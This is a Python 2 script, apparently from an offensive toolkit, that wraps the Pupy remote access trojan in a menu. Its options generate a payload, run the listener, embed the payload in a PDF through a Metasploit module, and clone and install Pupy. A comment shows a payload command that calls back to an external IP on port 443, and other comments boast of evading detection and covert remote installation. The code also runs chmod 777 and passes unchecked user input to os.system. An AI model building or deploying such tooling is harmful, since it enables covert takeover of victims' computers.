#!/usr/bin/env python
# coding=UTF-8

#The first line allows this script to be executable

import os
import socket
import operator
from termcolor import colored
import sys
sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=64, cols=200)) # sets window to full screen

print 'DISCLAIMER: This is the adapted interface as a response to the release of new Pupy version on April 17th'
print 'The UI has been remapped to adapt to the major syntax changes'
print 'Only the installer and payload generators have been confirmed to be working'
print 'Please raise a issue on GitHub if there is any major bugs'
# print 'I was searching for alternative RATs (Remote Access Trojans) and I liked Pupy so much the first time I tried it, I decided to add it to AC'
# print 'Pupy has the capability to generate a standalone executable payload for the Windows PE32 format'
# print 'As well as the newest, "State of the Art" Powershell-Payload Trend, enabling you to avoid detection and covertly install a Pupy Python Payload, remotely'
# print 'To my surprise, it also has compatibility with the USB Rubber Ducky, and can auto-generate the injection binary'
# print 'However syntax-wise, its difficult for most people that are not familiar with Python (or option-parsing) to understand'
# print '\n\nI made this to make it as easy as pressing a few buttons'
# print '\n\nSimply by using a payload that is not based on Metasploit, you already have a huge advantage in evading detection'
# print '\nMeanwhile Pupy Server commands are very similar to Meterpreter and Command Shells'
# print 'Plus, you can still have it interface with Metasploit if you wish'




def generate_pupy_payload():
    # python pupygen.py -f exe_x86 connect --host 52.53.180.45:443
    os.system('python /root/ArmsCommander/remoteexploits/Pupy_Payload_Generator.py')
    return

def server_pupy():
    opt_List = [
        '#0. Return to Main Menu',
        '#1. Use the pre-generated Pupy-Server Startup Script (Created when you made your payload)',
        '#2. Use a custom Pupy-Server Startup'
        # '#INSTALL. Attempt to use the Pupy-Installer script'
    ]

    print ("\n\t".join(opt_List))

    opt_Choice = str(raw_input("Enter a OPTION: "))

    if opt_Choice == "0":
        main()
    elif opt_Choice == "1":
        os.system('sudo chmod 777 /root/ArmsCommander')
        os.system('sudo /root/ArmsCommander/pupy_server_startup.sh')
    elif opt_Choice == "2":
        server_pupy_transport = str(raw_input("Enter your TRANSPORT (Protocol): "))
        server_pupy_port = str(raw_input("Enter your PORT: "))
        cmd_String = "python /root/pupy/pupy/pupysh.py -t %s -p %s" % (server_pupy_transport, server_pupy_port)
        print cmd_String
        os.system(cmd_String)
    # elif opt_Choice == "INSTALL": # all this does is define how the execution is run
    #     os.system('chmod 777 /root/ArmsCommander/remoteexploits/pupy_installer_firstattempt.sh')
    #     os.system('cp -r /root/ArmsCommander/remoteexploits/pupy_installer_firstattempt.sh /root')
    #     os.system('cd /root')
    #     os.system('/root/pupy_installer_firstattempt.sh') # runs the script

    else:
        print colored('You have entered a invalid option','red','on_white')
        server_pupy()
    return
# search embed
# use exploit/windows/fileformat/adobe_pdf_embedded_exe
# options
# set EXENAME /root/pupyx86.exe
# set INFILENAME /root/Desktop/11F19536X.pdf
# run

def embed_pdf():
    os.system('python /root/ArmsCommander/remoteexploits/embed_pdf_pupy.py')
    return

def main():
    opt_List = [
        '\n\t#1. Run Pupy Payload Generator',
        '#2. Run Pupy Listener/Server',
        '#3. Embed the payload into a PDF when run',
        '#INSTALL. Attempt to run the Pupy Installer, please be in your /root folder FIRST (not guaranteed to work)'
    ]

    root_directory = '/root'
    pupy_installation_dir = '/root/pupy'
    pupy_module_dir = '/root/pupy/pupy'
    print ("\n\t".join(opt_List))
    opt_Choice = str(raw_input("Enter a OPTION: "))

    if opt_Choice == "1":
        os.system('clear')
        generate_pupy_payload()
    elif opt_Choice == "2":
        os.system('clear')
        server_pupy()
    elif opt_Choice == "3":
        os.system('clear')
        embed_pdf()
    elif opt_Choice == "INSTALL": # all this does is define how the execution is run
        os.chdir(root_directory)
        print 'Cloning Git Repo'
        os.system('git clone https://github.com/n1nj4sec/pupy')
        os.chdir(pupy_installation_dir)
        print 'Initializing and Updating submodules'
        os.system('git submodule init')
        os.system('git submodule update')
        print 'Installing required Python Modules'
        os.chdir(pupy_module_dir)
        os.system('pip install -r requirements.txt')
        print 'Installation complete. Try it out in ArmsCommander'
    else:
        print colored('You have entered a invalid option','red','on_white')
        main()
main()
